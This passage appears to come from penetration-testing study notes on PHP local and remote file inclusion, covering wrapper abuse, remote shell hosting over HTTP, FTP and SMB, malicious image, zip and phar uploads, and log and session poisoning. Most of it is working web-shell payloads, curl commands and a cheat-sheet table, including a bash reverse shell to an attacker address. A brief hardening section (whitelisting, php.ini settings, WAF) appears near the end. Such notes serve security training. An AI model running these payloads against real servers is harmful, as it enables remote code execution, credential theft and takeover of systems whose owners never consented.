/index.php?language=php://filter/read=convert.base64-encode/resource=config

What you're doing: The convert.base64-encode filter encodes the file's contents as base64 before it's returned. PHP can't execute base64 text, so you get the raw encoded source instead of execution.

Note: We omit .php from the resource name because the app already appends .php to our input — so config becomes config.php.

➜ What you get A long base64 string in the page output.

Decode the result:

echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

What you're looking for in the decoded output:
- Database credentials (DB_PASS, mysqli_connect, PDO connection strings)
- Admin credentials
- API keys / tokens
- References to other PHP files (to continue mapping the app)
- Logic that reveals other vulnerabilities

Also works on config files:

curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"

Then decode and grep:

echo '<BASE64_STRING>' | base64 -d | grep allow_url_include

Why you're checking allow_url_include: This PHP setting controls whether include() can load remote URLs. It must be On to use the data:// wrapper and for RFI attacks. It's off by default.

PHP Wrappers — Remote Code Execution

Once you've confirmed that allow_url_include = On, you can use PHP wrappers to execute arbitrary code.

Data Wrapper

The data:// wrapper lets you embed data (including PHP code) directly in the URL as if it were a file.

Step 1 — Base64 encode a PHP web shell:

echo '<?php system($_GET["cmd"]); ?>' | base64
# Output: PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

Step 2 — URL encode the base64 string and pass it via the data wrapper:

/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id

Via cURL:

curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid

What you're doing:
1. The base64 string decodes to <?php system($_GET["cmd"]); ?>
2. The data:// wrapper feeds this to include() as if it were a file
3. PHP executes it, and $_GET["cmd"] is read from the cmd URL parameter
4. The id command runs on the server

➜ What you get Output like uid=33(www-data) gid=33(www-data) — confirms RCE.

What's next: Replace cmd=id with more useful commands: cmd=whoami, cmd=cat+/etc/passwd, or establish a reverse shell.

Input Wrapper

The php://input wrapper reads raw POST body data and passes it to include().

curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid

What you're doing: The PHP web shell is sent as POST body data. The php://input wrapper makes include() read from the POST body, effectively treating your shell code as a file.

Requirement: The vulnerable parameter must accept POST requests.

When to prefer this over data://: When the app or WAF blocks data:// in the URL but doesn't inspect POST body content.

Note: If the function only accepts POST (no $_REQUEST), embed the command directly in the shell: <?php system('id'); ?>

Expect Wrapper

The expect:// wrapper is a PHP extension that directly executes commands passed to it via a stream — no shell code needed.

Check if expect is installed:

echo '<BASE64_OF_PHP_INI>' | base64 -d | grep expect
# If installed, you'll see: extension=expect

Execute a command:

curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
# Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

What you're doing: expect://id tells PHP to execute id via the expect extension and return the output as a stream that include() reads.

Caveat: The expect extension is external — not bundled with PHP. It must be manually installed. Rarely found on modern servers, but worth checking.

Why it's powerful: No need to craft a web shell at all. Commands go straight in the URL.

Remote File Inclusion (RFI)

RFI is when the vulnerable function loads a file from a remote URL that you host. This gives you direct RCE without needing access to local files.

Functions that support Remote URL:

Function Remote URL
PHP include() ✅
PHP file_get_contents() ✅
Java import ✅
.NET @Html.RemotePartial() ✅
.NET include ✅

Key insight: Any RFI vulnerability is also an LFI vulnerability — functions that load remote URLs almost always also load local files. The reverse is not true.

Why RFI is often blocked:
1. allow_url_include must be On in PHP (disabled by default)
2. You may only control part of the parameter (not the full http:// prefix)
3. Server-side firewalls may block outbound connections

Verifying RFI

Method 1 — Check PHP config:

echo '<BASE64_PHP_INI>' | base64 -d | grep allow_url_include
# allow_url_include = On  → RFI likely possible

Method 2 — Try including a local URL (more reliable):

/index.php?language=http://127.0.0.1:80/index.php

What you're doing: Trying to include the server's own homepage via HTTP. If it works (the page renders inside itself), RFI is confirmed.

Bonus: This also confirms SSRF — you can probe internal services. Try other ports: http://127.0.0.1:8080, http://127.0.0.1:3306, etc.

Warning: Don't include the vulnerable page recursively — it can cause an infinite loop and crash the server.

RCE via HTTP

Step 1 — Create a PHP web shell locally:

echo '<?php system($_GET["cmd"]); ?>' > shell.php

Step 2 — Start a Python HTTP server to serve the file:

sudo python3 -m http.server <LISTENING_PORT>
# Example: sudo python3 -m http.server 8000

Why use port 80 or 443? Outbound connections from the target to common HTTP ports (80/443) are less likely to be blocked by firewalls than arbitrary ports.

Step 3 — Include your shell via RFI:

/index.php?language=http://<YOUR_IP>:<LISTENING_PORT>/shell.php&cmd=id

What you're doing: The vulnerable server makes an outbound HTTP request to your machine, downloads shell.php, and include() executes it.

Confirming it worked: Your Python server terminal will show the incoming request: "GET /shell.php HTTP/1.0" 200

What's next: Replace id with any command. Escalate to a reverse shell:
cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<YOUR_IP>/4444+0>%261'

RCE via FTP

When to use this: If HTTP ports are blocked or the http:// string is filtered by a WAF.

Step 1 — Start an FTP server (anonymous access):

sudo python -m pyftpdlib -p 21

Tool: pyftpdlib — Python FTP server library. Install with pip install pyftpdlib.

Step 2 — Include shell via FTP:

curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://<YOUR_IP>/shell.php&cmd=id'

With credentials:

curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<YOUR_IP>/shell.php&cmd=id'

Note: PHP attempts anonymous FTP login by default. If the server requires credentials, pass them in the URL as shown above.

RCE via SMB (Windows)

When to use this: Target is a Windows server and allow_url_include is not required.

Why SMB works differently: Windows treats files on remote SMB shares as local files. This bypasses the allow_url_include requirement entirely.

Step 1 — Start an SMB server with anonymous access:

impacket-smbserver -smb2support share $(pwd)

Tool: Impacket — impacket-smbserver creates an SMB share in the current directory.

Step 2 — Include shell via UNC path:

/index.php?language=\\<YOUR_IP>\share\shell.php&cmd=whoami

Caveat: This is more likely to succeed on the same network (internal pentest). Remote SMB over the internet is usually blocked by firewalls.

LFI + File Uploads

If the application allows file uploads and the LFI function has Execute privileges, you can upload a disguised shell and then include it.

Key insight: The file upload form itself doesn't need to be vulnerable. You only need it to accept and store your file. The vulnerability is in the LFI function, not the upload form.

Malicious Image Upload

Images are "safe" — most apps allow them. But if you embed PHP code inside an image file, and then include it via LFI, the PHP executes.

Step 1 — Create a malicious image with embedded PHP:

echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif

Why GIF8? These are the magic bytes that identify a GIF file. Some upload validators check file signatures (magic bytes), not just extensions. GIF8 is ASCII-printable and easy to prepend. Other image formats have binary magic bytes that need URL encoding.

Step 2 — Upload the image through the app's normal upload feature (e.g., profile picture upload).

Step 3 — Find the uploaded file path by inspecting the page source after uploading:

<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">

Step 4 — Include and execute:

/index.php?language=./profile_images/shell.gif&cmd=id
➜ What you get The GIF8 header is treated as HTML output, then uid=33(www-data) appears — confirming RCE.

If the path is prefixed by the app, traverse out first: ../../../../profile_images/shell.gif

Zip Upload

⚡ When to use The app blocks image execution but accepts zip files (or you can disguise a zip as an image).

Step 1 — Create a PHP shell and zip it:

echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php

Note: Named shell.jpg to pass extension checks, but it's actually a zip archive. Some content-type validators will still detect it as a zip.

Step 2 — Include using the zip:// wrapper:

/index.php?language=zip://shell.jpg%23shell.php&cmd=id

Breakdown:
- zip://shell.jpg — points to the zip archive
- %23 — URL-encoded #, used to reference a file inside the zip
- shell.php — the file inside the archive to execute

Why this wrapper isn't always available: zip:// is not enabled by default on all PHP installs.

Phar Upload

⚡ When to use Alternative to zip when zip:// isn't available.

Step 1 — Create a PHP script to generate a phar archive:

<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();

Step 2 — Compile and rename:

php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg

Why phar.readonly=0? By default, PHP prevents creating phar archives for security. This flag disables that restriction during compilation.

Step 3 — Upload shell.jpg and include with phar wrapper:

/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

Breakdown:
- phar:// — PHP phar stream wrapper
- ./profile_images/shell.jpg — path to uploaded phar (disguised as jpg)
- %2F — URL-encoded /
- shell.txt — the sub-file inside the phar that contains our shell

Log Poisoning

Concept: Write PHP code into a log file that you control, then include that log file via LFI. When PHP processes the log file, it executes your injected code.

Requirements:
- LFI vulnerability with Execute privileges
- Read access to a log file
- Ability to control a value that gets written to the log

Functions required (Execute privilege): include(), require(), res.render() (NodeJS), import (Java), include (.NET)

PHP Session Poisoning

PHP stores session data in files on disk. If a session value is controlled by you, you can write PHP code into your session file, then include it via LFI.

Step 1 — Find your PHPSESSID cookie:

Open browser DevTools → Application → Cookies. Look for PHPSESSID, e.g., nhhv8i0o6ua4g88bkdl9u1fdsd.

Step 2 — Read your session file via LFI:

/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd

Session file paths:
- Linux: /var/lib/php/sessions/sess_<PHPSESSID>
- Windows: C:\Windows\Temp\sess_<PHPSESSID>

🔍 What you're looking for Values in the session file that you control. For example, if the page key stores your language parameter value, you can poison it.

Step 3 — Poison the session by setting language to PHP code:

/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E

URL-decoded: <?php system($_GET["cmd"]); ?>
This gets written to your session file as the value of page.

Step 4 — Include the session file and execute:

/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id

Important: The session file gets overwritten on each page load. You need to re-poison before each command execution. The better approach is to use the shell to write a permanent web shell to disk:
cmd=echo+%27%3C%3Fphp+system%28%24_GET%5B"cmd"%5D%29%3B+%3F%3E%27+>+/var/www/html/shell.php

Apache & Nginx Log Poisoning

Web servers log every request, including the User-Agent header — which you fully control. By injecting PHP code into the User-Agent, you poison the access log. Then include the log via LFI to achieve RCE.

Log file locations:

Server Linux Windows
Apache /var/log/apache2/access.log C:\xampp\apache\logs\access.log
Nginx /var/log/nginx/access.log C:\nginx\log\access.log

Access permissions:
- Nginx logs → readable by low-privilege users (e.g., www-data) by default ✅
- Apache logs → typically require root or adm group ⚠️ (but misconfigured servers may allow it)

Step 1 — Confirm you can read the log:

/index.php?language=/var/log/apache2/access.log

What you see: Recent HTTP requests including IP, path, status code, and User-Agent strings.

Step 2 — Poison the log by sending a request with a malicious User-Agent:

Via Burp Suite: Intercept any request → change User-Agent header to:

<?php system($_GET['cmd']); ?>

Via cURL:

curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'

-A flag: Sets the User-Agent header. This gets written into the server's access log.

Step 3 — Include the poisoned log and execute:

/index.php?language=/var/log/apache2/access.log&cmd=id

What happens: PHP processes the log file, hits your injected <?php system(...); ?> in the User-Agent field, and executes it.

Performance warning: Log files can be very large and slow to load. Be efficient — don't spam unnecessary requests.

Other poisonable logs:

/var/log/sshd.log    → Set username to PHP code during SSH login attempt
/var/log/mail        → Send an email with PHP code in the body/subject
/var/log/vsftpd.log  → FTP login attempts are logged
/proc/self/environ   → User-Agent is stored here too
/proc/self/fd/N      → File descriptors (N = 0-50)

Technique generalization: Any log that records a value you control, and that you can read via LFI, is a candidate for log poisoning.

Automated Scanning

Fuzzing Parameters

Web forms are usually well-tested, but apps often have undocumented GET/POST parameters not linked to any form. Fuzz for these:

ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
  -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

-fs 2287: Filter responses by size. 2287 is the size of the normal page response — responses with a different size indicate the parameter had an effect.

🔍 What you're looking for Parameters that cause different response sizes when given input — they may be passed to include() or similar functions.

Tip: Limit to LFI-specific parameter names using this curated list: https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters

LFI Wordlists

Once you find a parameter, fuzz it with known LFI payloads:

ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
  -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

Wordlist: LFI-Jhaddix.txt — a comprehensive list combining traversal sequences, bypass techniques, and common file paths. One of the best LFI wordlists available.

➜ What you get A list of payloads that returned different-sized responses — these likely worked and read a file.

What's next: Manually test each successful payload to confirm the file content is returned, then use the confirmed path for further exploitation.

Fuzzing Server Files & Configs

Find the webroot path:

ffuf -w /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ \
  -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287

What you're doing: Checking if index.php exists under various common webroot paths. A hit tells you the exact server webroot (e.g., /var/www/html/).

Why you need this: If you've uploaded a file but can't reach it via relative paths, knowing the absolute webroot lets you construct the correct path.

Linux wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt
Windows wordlist: https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt

Fuzz server logs and config files:

ffuf -w ./LFI-WordList-Linux:FUZZ \
  -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

Wordlists:
- Linux: https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
- Windows: https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows

🔍 What you're looking for Config files that reveal server paths, log locations, and other sensitive settings.

Read Apache config to find log paths:

curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf

The config shows ErrorLog ${APACHE_LOG_DIR}/error.log. To resolve the variable:

curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
# Look for: export APACHE_LOG_DIR=/var/log/apache2

LFI Tools (Automated)

⚠️ Caveat: Most are unmaintained and Python 2-dependent. Manual testing is more reliable and finds more edge cases.

Popular tools (test on labs, don't rely on for real engagements):
- LFISuite — https://github.com/D35m0nd142/LFISuite
- LFiFreak — https://github.com/OsandaMalith/LFiFreak
- liffy — https://github.com/mzfr/liffy

File Inclusion Prevention

Application-Level Fixes

Best fix: Never pass user input into file inclusion functions at all. Use a static whitelist:

// Instead of:
include($_GET['page']);

// Use a whitelist:
$allowed = ['home' => 'home.php', 'about' => 'about.php'];
$page = $allowed[$_GET['page']] ?? 'home.php';
include($page);

Recursive directory traversal sanitization:

while(substr_count($input, '../', 0)) {
    $input = str_replace('../', '', $input);
}

Why recursive? Non-recursive str_replace is bypassable with ....// as shown earlier.

For directory inputs — use basename():

$file = basename($_GET['language']);
include("./languages/" . $file);

Limitation: basename() strips directory components entirely, so the app can no longer load files from subdirectories.

PHP Configuration Hardening

Edit php.ini:

# Disable remote file inclusion
allow_url_fopen = Off
allow_url_include = Off

# Restrict file access to the web root only
open_basedir = /var/www

open_basedir: Prevents PHP from accessing any file outside the specified directory. Even if LFI exists, reading /etc/passwd would be blocked.

Disable dangerous modules:
- expect (command execution via streams)
- mod_userdir (user directory access)

Docker / OS-Level Containment

Run the application inside Docker to isolate it from the host filesystem. Even if LFI is exploited, the attacker is limited to the container's filesystem.

Web Application Firewall (WAF)

Use ModSecurity or similar:
- Start in permissive mode (logs but doesn't block) to tune rules and avoid false positives
- Graduate to blocking mode once tuned
- Acts as an early warning system — attackers trying LFI payloads will generate distinctive log entries

Key insight from FireEye M-Trends 2020: Average breach detection time was 30 days. A WAF in permissive mode can surface attack patterns much earlier, giving defenders time to respond.

Cheat Sheet — Quick Reference

Basic LFI

Goal Payload
Basic LFI (absolute path) /index.php?language=/etc/passwd
LFI with path traversal /index.php?language=../../../../etc/passwd
LFI with name prefix /index.php?language=/../../../etc/passwd
LFI with approved path /index.php?language=./languages/../../../../etc/passwd

LFI Bypasses

Goal Payload
Bypass basic ../ filter (non-recursive) /index.php?language=....//....//....//....//etc/passwd
Bypass with URL encoding /index.php?language=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
Bypass appended extension (path truncation, obsolete) non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
Bypass appended extension (null byte, obsolete) /index.php?language=../../../../etc/passwd%00
Read PHP source (base64 filter) /index.php?language=php://filter/read=convert.base64-encode/resource=config

PHP Wrappers (RCE)

Goal Command
RCE with data wrapper /index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
RCE with input wrapper curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<IP>:<PORT>/index.php?language=php://input&cmd=id"
RCE with expect wrapper curl -s "http://<IP>:<PORT>/index.php?language=expect://id"

RFI

Goal Command
Host web shell (HTTP) echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <PORT>
Include remote shell /index.php?language=http://<YOUR_IP>:<PORT>/shell.php&cmd=id
Host FTP server sudo python -m pyftpdlib -p 21
Include via FTP curl 'http://<IP>:<PORT>/index.php?language=ftp://<YOUR_IP>/shell.php&cmd=id'
Host SMB (Windows targets) impacket-smbserver -smb2support share $(pwd)
Include via SMB /index.php?language=\\<YOUR_IP>\share\shell.php&cmd=whoami

LFI + Upload

Goal Command
Create malicious image echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
Execute via LFI /index.php?language=./profile_images/shell.gif&cmd=id
Create malicious zip echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
Execute via zip wrapper /index.php?language=zip://shell.zip%23shell.php&cmd=id
Create malicious phar php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
Execute via phar wrapper /index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id

Log Poisoning

Goal Command / Payload
Read PHP session file /index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>
Poison session with shell /index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
Execute via poisoned session /index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
Poison Apache log (cURL) curl -s "http://<IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
Execute via poisoned log /index.php?language=/var/log/apache2/access.log&cmd=id

Fuzzing

Goal Command
Fuzz for exposed parameters ffuf -w burp-parameter-names.txt:FUZZ -u 'http://<IP>:<PORT>/index.php?FUZZ=value' -fs 2287
Fuzz LFI payloads ffuf -w LFI-Jhaddix.txt:FUZZ -u 'http://<IP>:<PORT>/index.php?language=FUZZ' -fs 2287
Fuzz webroot path ffuf -w default-web-root-directory-linux.txt:FUZZ -u 'http://<IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
Fuzz server configs/logs ffuf -w LFI-WordList-Linux:FUZZ -u 'http://<IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287

Tools Reference

ffuf

Fast web fuzzer written in Go. Used for directory/file discovery, parameter fuzzing, and payload testing.
- Repo: https://github.com/ffuf/ffuf
- Key flags used here:
- -w <wordlist>:FUZZ — specify wordlist and substitution keyword
- -u <URL> — target URL with FUZZ placeholder
- -fs <size> — filter responses by size (exclude baseline size)
- -mc all — match all HTTP status codes

Burp Suite

The industry standard web proxy for intercepting and modifying HTTP requests. Used here to:
- Intercept requests and modify headers (e.g., User-Agent for log poisoning)
- Use the Decoder tab to URL-encode/decode and Base64-encode/decode payloads
- Download: https://portswigger.net/burp

curl

Command-line HTTP client. Essential for sending custom requests.
- Key flags:
- -s — silent (no progress bar)
- -X POST — specify HTTP method
- --data '<body>' — set POST body
- -A '<string>' — set User-Agent header

pyftpdlib

Python FTP server library. Used to quickly spin up an anonymous FTP server for RFI attacks.
- Install: pip install pyftpdlib
- Usage: sudo python -m pyftpdlib -p 21

Impacket (impacket-smbserver)

A collection of Python classes for working with network protocols. impacket-smbserver creates a temporary SMB share — used for RFI on Windows targets.
- Repo: https://github.com/fortra/impacket
- Install: pip install impacket
- Usage: impacket-smbserver -smb2support share $(pwd)

SecLists

A massive collection of wordlists for security testing, including LFI payloads, parameter names, directory lists, etc.
- Repo: https://github.com/danielmiessler/SecLists
- Key wordlists used:
- Fuzzing/LFI/LFI-Jhaddix.txt
- Discovery/Web-Content/burp-parameter-names.txt
- Discovery/Web-Content/default-web-root-directory-linux.txt
- Discovery/Web-Content/directory-list-2.3-small.txt
